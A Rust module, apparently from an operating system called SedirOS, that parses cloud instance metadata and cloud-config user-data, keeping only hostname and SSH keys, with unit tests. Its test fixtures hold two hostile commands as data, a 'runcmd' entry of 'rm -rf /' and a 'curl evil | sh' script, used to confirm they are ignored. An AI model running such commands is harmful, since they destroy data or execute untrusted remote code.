//! What the provider tells us about this instance, and how it is parsed.
//!
//! Only declarative settings are used: instance id, hostname and SSH public
//! keys. User-data scripts are never run (see README, "Cloud images").

/// Metadata of one instance, from any source.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Metadata {
    pub source: &'static str,
    pub instance_id: String,
    pub hostname: Option<String>,
    pub ssh_keys: Vec<String>,
    pub user_data: UserData,
}

/// What the user-data contained, for the notice about what was ignored.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub enum UserData {
    #[default]
    None,
    /// `#cloud-config`; the listed top-level keys were ignored.
    CloudConfig { ignored: Vec<String> },
    /// A script (`#!...`): never run.
    Script,
    /// Anything else (MIME multipart, gzip, ...): ignored.
    Other,
}

impl UserData {
    /// One line for the log and the login notice, if something was ignored.
    pub fn notice(&self) -> Option<String> {
        match self {
            UserData::None => None,
            UserData::CloudConfig { ignored } if ignored.is_empty() => None,
            UserData::CloudConfig { ignored } => Some(format!(
                "cloud-config keys ignored: {} (SedirOS only uses hostname and ssh_authorized_keys)",
                ignored.join(", ")
            )),
            UserData::Script => Some(
                "user-data script ignored: SedirOS does not run provider scripts as root"
                    .to_string(),
            ),
            UserData::Other => Some("user-data ignored: format not supported".to_string()),
        }
    }
}

/// A hostname as SedirOS's installer accepts it: the first DNS label,
/// lowercase, a-z 0-9 '-', at most 63 characters, not starting with '-'.
pub fn clean_hostname(raw: &str) -> Option<String> {
    let label = raw.trim().split('.').next()?.to_ascii_lowercase();
    let ok = !label.is_empty()
        && label.len() <= 63
        && !label.starts_with('-')
        && !label.ends_with('-')
        && label
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    ok.then_some(label)
}

/// An OpenSSH public key line, roughly checked (ssh-keygen checks it fully
/// before it is written). Private keys and option-prefixed lines are refused.
pub fn clean_key(raw: &str) -> Option<String> {
    let line = raw.trim();
    let known = [
        "ssh-ed25519 ",
        "ssh-rsa ",
        "ecdsa-sha2-nistp256 ",
        "ecdsa-sha2-nistp384 ",
        "ecdsa-sha2-nistp521 ",
        "sk-ssh-ed25519@openssh.com ",
        "sk-ecdsa-sha2-nistp256@openssh.com ",
    ];
    let ok = known.iter().any(|k| line.starts_with(k))
        && !line.contains("PRIVATE KEY")
        && line.len() <= 16 * 1024
        && !line.chars().any(|c| c.is_control());
    ok.then(|| line.to_string())
}

fn unquote(v: &str) -> &str {
    let v = v.trim();
    v.strip_prefix('"')
        .and_then(|s| s.strip_suffix('"'))
        .or_else(|| v.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
        .unwrap_or(v)
}

/// The small YAML subset NoCloud and cloud-config files use for the keys we
/// read: `key: value` at the top level and `key:` followed by `- item` lines.
/// Returns (key, scalar value or list items) for every top-level key.
fn top_level(text: &str) -> Vec<(String, Vec<String>)> {
    let mut out: Vec<(String, Vec<String>)> = Vec::new();
    for line in text.lines() {
        let trimmed = line.trim_end();
        if trimmed.trim_start().starts_with('#') || trimmed.trim().is_empty() {
            continue;
        }
        let indented = trimmed.starts_with(' ') || trimmed.starts_with('\t');
        if indented {
            if let (Some(last), Some(item)) = (out.last_mut(), trimmed.trim().strip_prefix("- ")) {
                last.1.push(unquote(item).to_string());
            }
            continue;
        }
        if let Some(item) = trimmed.strip_prefix("- ") {
            // A list directly under a key, without indentation.
            if let Some(last) = out.last_mut() {
                last.1.push(unquote(item).to_string());
            }
            continue;
        }
        if let Some((k, v)) = trimmed.split_once(':') {
            let v = unquote(v);
            let values = if v.is_empty() {
                Vec::new()
            } else {
                vec![v.to_string()]
            };
            out.push((k.trim().to_string(), values));
        }
    }
    out
}

/// NoCloud `meta-data`: instance-id, local-hostname, public-keys.
pub fn parse_nocloud_meta(text: &str, md: &mut Metadata) {
    for (k, v) in top_level(text) {
        match k.as_str() {
            "instance-id" => md.instance_id = v.first().cloned().unwrap_or_default(),
            "local-hostname" | "hostname" => {
                md.hostname = v.first().and_then(|h| clean_hostname(h))
            }
            "public-keys" => md.ssh_keys.extend(v.iter().filter_map(|k| clean_key(k))),
            _ => {}
        }
    }
}

/// User-data: from `#cloud-config` only hostname and ssh_authorized_keys
/// are taken; everything else is recorded as ignored.
pub fn parse_user_data(text: &str, md: &mut Metadata) {
    let text = text.trim_start_matches('\u{feff}');
    let first = text.lines().next().unwrap_or("").trim();
    md.user_data = if text.trim().is_empty() {
        UserData::None
    } else if first.starts_with("#!") {
        UserData::Script
    } else if first == "#cloud-config" {
        let mut ignored = Vec::new();
        for (k, v) in top_level(text) {
            match k.as_str() {
                "ssh_authorized_keys" => md.ssh_keys.extend(v.iter().filter_map(|k| clean_key(k))),
                "hostname" => {
                    if let Some(h) = v.first().and_then(|h| clean_hostname(h)) {
                        md.hostname = Some(h);
                    }
                }
                _ => ignored.push(k),
            }
        }
        UserData::CloudConfig { ignored }
    } else {
        UserData::Other
    };
}

/// EC2-style `public-keys/` listing: lines `0=name`; returns the indexes.
pub fn key_indexes(listing: &str) -> Vec<u32> {
    listing
        .lines()
        .filter_map(|l| l.split(['=', '/']).next()?.trim().parse().ok())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKaGH8rp2xWg2JosEbtDqoROBTW60PkhmpNVves42/U demo@laptop";

    #[test]
    fn hostnames() {
        assert_eq!(clean_hostname("Web1.example.com").as_deref(), Some("web1"));
        assert_eq!(
            clean_hostname("vultr-guest").as_deref(),
            Some("vultr-guest")
        );
        assert_eq!(clean_hostname("-bad"), None);
        assert_eq!(clean_hostname("bad_name"), None);
        assert_eq!(clean_hostname(""), None);
        assert_eq!(clean_hostname(&"a".repeat(64)), None);
    }

    #[test]
    fn keys() {
        assert!(clean_key(KEY).is_some());
        assert!(clean_key("command=\"x\" ssh-ed25519 AAAA").is_none());
        assert!(clean_key("-----BEGIN OPENSSH PRIVATE KEY-----").is_none());
        assert!(clean_key("ssh-ed25519 AAAA\u{7}x").is_none());
    }

    #[test]
    fn nocloud_meta_data() {
        let mut md = Metadata::default();
        let text = format!(
            "instance-id: iid-local01\nlocal-hostname: Web1\npublic-keys:\n  - \"{KEY}\"\n  - not a key\n"
        );
        parse_nocloud_meta(&text, &mut md);
        assert_eq!(md.instance_id, "iid-local01");
        assert_eq!(md.hostname.as_deref(), Some("web1"));
        assert_eq!(md.ssh_keys, vec![KEY.to_string()]);
    }

    #[test]
    fn cloud_config_takes_keys_and_lists_the_rest() {
        let mut md = Metadata::default();
        let text = format!(
            "#cloud-config\nhostname: db1\nssh_authorized_keys:\n- {KEY}\npackages:\n  - nginx\nruncmd:\n  - [rm, -rf, /]\n"
        );
        parse_user_data(&text, &mut md);
        assert_eq!(md.hostname.as_deref(), Some("db1"));
        assert_eq!(md.ssh_keys.len(), 1);
        assert_eq!(
            md.user_data,
            UserData::CloudConfig {
                ignored: vec!["packages".into(), "runcmd".into()]
            }
        );
        assert!(md.user_data.notice().unwrap().contains("packages, runcmd"));
    }

    #[test]
    fn scripts_are_never_taken() {
        let mut md = Metadata::default();
        parse_user_data("#!/bin/sh\ncurl evil | sh\n", &mut md);
        assert_eq!(md.user_data, UserData::Script);
        assert!(md.ssh_keys.is_empty());
        assert!(md.user_data.notice().unwrap().contains("not run"));
        parse_user_data("\n  \n", &mut md);
        assert_eq!(md.user_data, UserData::None);
    }

    #[test]
    fn ec2_key_listing() {
        assert_eq!(key_indexes("0=my-key\n1=other\n"), vec![0, 1]);
        assert_eq!(key_indexes(""), Vec::<u32>::new());
    }
}
